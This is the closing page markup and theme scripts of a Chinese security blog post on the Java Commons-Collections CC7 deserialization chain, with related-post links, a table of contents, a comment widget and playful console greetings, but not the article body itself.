anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC5</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4/" title="java反序列化--CC4"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC4</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/" title="java反序列化--CC2"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC2</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6/" title="java反序列化--CC6"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC6</div></div></a></div><div><a href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3/" title="java反序列化--CC3"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-07</div><div class="title">java反序列化--CC3</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2021/03/03/e511960ac5488.png" alt="status"/></div></div><div class="author-info__description">生活明朗 万物可爱</div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">大家好 我是VV 欢迎来看我的博客鸭~  之前上传文章的时候 图床好像被DDOS了 有些图片没上传起 懒的重新弄了 大家需要的话d我 我重新上传</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%93CC7"><span class="toc-number">1.</span> <span class="toc-text">java反序列化–CC7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">1.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">链子分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%86%E8%8A%82%E5%A4%84%E7%90%86"><span class="toc-number">1.3.</span> <span class="toc-text">细节处理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81hash%E5%80%BC%E7%9B%B8%E5%90%8C"><span class="toc-number">1.3.1.</span> <span class="toc-text">为什么要hash值相同</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%85%83%E7%B4%A0%EF%BC%88yy-yy%EF%BC%89%E4%BB%8E%E4%BD%95%E8%80%8C%E6%9D%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二个元素（yy&#x3D;yy）从何而来</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/JAVA%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/" title="JAVA加载字节码">JAVA加载字节码</a><time datetime="2024-06-07T13:32:59.000Z" title="发表于 2024-06-07 21:32:59">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/" title="java反序列化--CC7">java反序列化--CC7</a><time datetime="2024-06-07T13:21:19.000Z" title="发表于 2024-06-07 21:21:19">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6/" title="java反序列化--CC6">java反序列化--CC6</a><time datetime="2024-06-07T13:21:15.000Z" title="发表于 2024-06-07 21:21:15">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5/" title="java反序列化--CC5">java反序列化--CC5</a><time datetime="2024-06-07T13:21:09.000Z" title="发表于 2024-06-07 21:21:09">2024-06-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4/" title="java反序列化--CC4">java反序列化--CC4</a><time datetime="2024-06-07T13:21:03.000Z" title="发表于 2024-06-07 21:21:03">2024-06-07</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By VVkladg0r</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">3</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CC%E9%93%BE/" style="font-size: 0.88rem;">CC链<sup>7</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>12</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">java安全<sup>12</sup></a><a href="/tags/misc/" style="font-size: 0.88rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>7</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 0.88rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.88rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">学习<sup>12</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2024 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 VVkladg0r 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
+  const initWaline = () => {
+    const waline = Waline.init(Object.assign({
+      el: '#waline-wrap',
+      serverURL: 'waline.cszvvds.cc',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      path: window.location.pathname,
+      comment: false,
+    }, null))
+  }
+
+  const loadWaline = async () => {
+    if (typeof Waline === 'object') initWaline()
+    else {
+      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
+      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
+      initWaline()
+    }
+  }
+
+  if ('Waline' === 'Waline' || !true) {
+    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
+  const changeContent = content => {
+    if (content === '') return content
+
+    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
+    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
+    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
+    content = content.replace(/<[^>]+>/g,"") // remove html tag
+
+    if (content.length > 150) {
+      content = content.substring(0,150) + '...'
+    }
+    return content
+  }
+
+  const generateHtml = array => {
+    let result = ''
+
+    if (array.length) {
+      for (let i = 0; i < array.length; i++) {
+        result += '<div class=\'aside-list-item\'>'
+
+        if (true) {
+          const name = 'data-lazy-src'
+          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
+        }
+
+        result += `<div class='content'>
+        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += '没有评论'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom && ($dom.innerHTML= result)
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = async () => {
+    try {
+      const res = await fetch('waline.cszvvds.cc/api/comment?type=recent&count=6', { method: 'GET' })
+      const result = await res.json()
+      const walineArray = result.data.map(e => {
+        return {
+          'content': changeContent(e.comment),
+          'avatar': e.avatar,
+          'nick': e.nick,
+          'url': e.url + '#' + e.objectId,
+          'date': e.time || e.insertedAt
+        }
+      })
+      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
+      generateHtml(walineArray)
+    } catch (err) {
+      console.error(err)
+      const $dom = document.querySelector('#card-newest-comments .aside-list')
+      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
+    }
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('waline-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
